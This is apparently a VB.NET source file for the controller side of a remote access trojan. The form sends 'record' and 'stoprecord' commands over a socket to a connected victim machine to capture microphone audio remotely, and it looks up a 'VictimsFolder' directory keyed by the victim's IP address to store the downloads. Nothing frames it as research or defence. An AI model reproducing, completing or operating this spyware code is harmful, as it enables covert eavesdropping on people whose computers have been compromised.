Public Class MIC
    Public sock As Integer
    Public recording As Boolean
    Private stopwatch As New Stopwatch
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseDown, Label2.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseUp, Label2.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseMove, Label2.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub





#End Region

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        'rec
       Main.S.Send(sock, "record")
        Timer1.Start()
        Me.stopwatch.Start()
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        'stop
        Main.S.Send(sock, "stoprecord")
        Me.stopwatch.Stop()
        Me.stopwatch.Reset()
        Label1.Text = "00:00:00:00"
    End Sub

    Dim i = 0
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick

        Dim elapsed As TimeSpan = Me.stopwatch.Elapsed
        Label1.Text = String.Format("{0:00}:{1:00}:{2:00}:{3:00}", _
        Math.Floor(elapsed.TotalHours), _
        elapsed.Minutes, elapsed.Seconds, _
        elapsed.Milliseconds)





    End Sub
    Dim DownloadVictimFolder As String
    Sub getfolder()
        For Each folder In IO.Directory.GetDirectories(Application.StartupPath & "\VictimsFolder\")
            If folder.Contains(Main.S.IP(sock)) Then
                DownloadVictimFolder = folder
                Exit Sub
            End If
        Next
    End Sub

    Private Sub MIC_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
    End Sub

    Private Sub buttonClos_Click(sender As System.Object, e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub
End Class